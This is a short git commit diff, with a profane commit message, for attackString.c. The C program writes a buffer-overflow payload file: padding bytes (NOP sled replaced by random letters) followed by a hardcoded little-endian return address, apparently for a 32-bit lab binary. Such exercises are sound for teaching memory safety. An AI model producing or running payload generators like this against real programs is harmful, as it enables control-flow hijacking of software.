afb3182e6ab5a5c209a9ecbee68e04caf200d69e
DMo <daveman0331@gmail.com>
2015-04-17 16:49:21 -0400

    DONE, FUCKERS

--- attackString.c
+++ attackString.c
@@ -1,15 +1,18 @@
 #include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
 
 int main(){
-	char outLine[107];
+	srand(time(NULL));
+	char outLine[116];
 	int i;
-	for(i=0;i<103;i++){
-		outLine[i] = 0x90;
+	for(i=0;i<(112);i++){
+		outLine[i] = 'A' + (random()%26);
 	}
-	outLine[103] = 0x7f;
-	outLine[104] = 0x8e;
-	outLine[105] = 0x04;
-	outLine[106] = 0x08;
+	outLine[i++] = 0x7f;
+	outLine[i++] = 0x8e;
+	outLine[i++] = 0x04;
+	outLine[i++] = 0x08;
 	
 	FILE* fp;
 	fp = fopen("attack.input","w");
